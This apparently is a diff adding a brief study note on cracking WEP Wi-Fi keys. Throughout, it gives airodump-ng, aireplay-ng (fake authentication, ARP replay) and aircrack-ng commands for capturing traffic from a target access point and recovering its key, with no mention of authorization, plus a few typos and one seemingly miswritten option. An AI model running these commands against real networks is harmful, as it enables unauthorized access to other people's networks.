@@ -1,0 +1,41 @@
+Wifi Hacking WEP mode
+
+
+To crack WEP we need to: 
+1. Capture a large number of packets/IVs. →using airodump-ng 
+2. Analyse the captured IVs and crack the key. → using aircrack-ng
+    IMP NOTE:- make sure network is  busy
+
+//Chapture Large number of packets
+
+**Target packet sniffing
+airodump-ng --bssid <MAC> --channel <1> --write test wlan0(interface name)
+	##analyse test.cap fileusing wireshark 
+
+//Crack the IV key 
+
+aircrack-ng filename.cap
+
+    key found = [11:22:33:44:55]  ASCII:(asdfg)
+
+    NOTE:- ASCII ==> Password OR 1122334455 is the key we can connect both 
+
+
+
+//FAKE authentication (If network is not busy)
+
+**Target packet sniffing
+airodump-ng --bssid <MAC> --channel <1> --write test wlan0(interface name)
+	##analyse test.cap fileusing wireshark 
+
+aireplay-ng --fakeauth 0 -a {AP mac} -h {network apdater mac}  wlan0{interface name}
+
+//ARP Replay attack
+
+**Target packet sniffing
+airodump-ng --bssid <MAC> --channel <1> --write test wlan0(interface name)
+	##analyse test.cap fileusing wireshark
+
+aireplay-ng --arpreplay -B {AP mac} -h {network apdater mac}  wlan0{interface name}
+
+aircrack-ng filename.cap
